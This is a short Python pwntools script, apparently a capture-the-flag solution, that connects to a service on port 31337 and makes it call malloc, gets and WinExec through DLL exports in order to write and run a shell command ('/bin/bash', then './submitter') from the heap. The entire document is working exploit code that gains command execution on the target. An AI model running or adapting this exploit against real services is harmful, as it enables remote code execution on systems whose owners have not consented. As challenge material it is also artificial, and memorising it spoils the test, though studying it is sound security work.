from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

sh = remote(HOST, int(PORT))
sh.sendlineafter(b'?\r\n', b'msvcrt.dll')
sh.sendlineafter(b'?\r\n', b'malloc')
sh.sendlineafter(b'?\r\n', str(0x100).encode())
sh.recvuntil(b'\r\n')
out = sh.recvuntil(b'\r\n').strip()

heap_addr = int(out.split(b': ')[-1],16)
print(hex(heap_addr))

sh.sendlineafter('?\r\n', b'msvcrt.dll')
sh.sendlineafter(b'?\r\n', b'gets')
sh.sendlineafter(b'?\r\n', str(heap_addr).encode())
sh.sendline(b'/bin/bash')

sh.sendlineafter(b'?\r\n', b'kernel32.dll')
sh.sendlineafter(b'?\r\n', b'WinExec')
sh.sendlineafter(b'?\r\n', str(heap_addr).encode())
sh.sendline(b'./submitter')
sh.sendline(b'./submitter')
sh.sendline(b'./submitter')
sh.sendline(b'./submitter')

print(sh.recv(1024))
print(sh.recv(1024))
print(sh.recv(1024))
print(sh.recv(1024))
sh.close()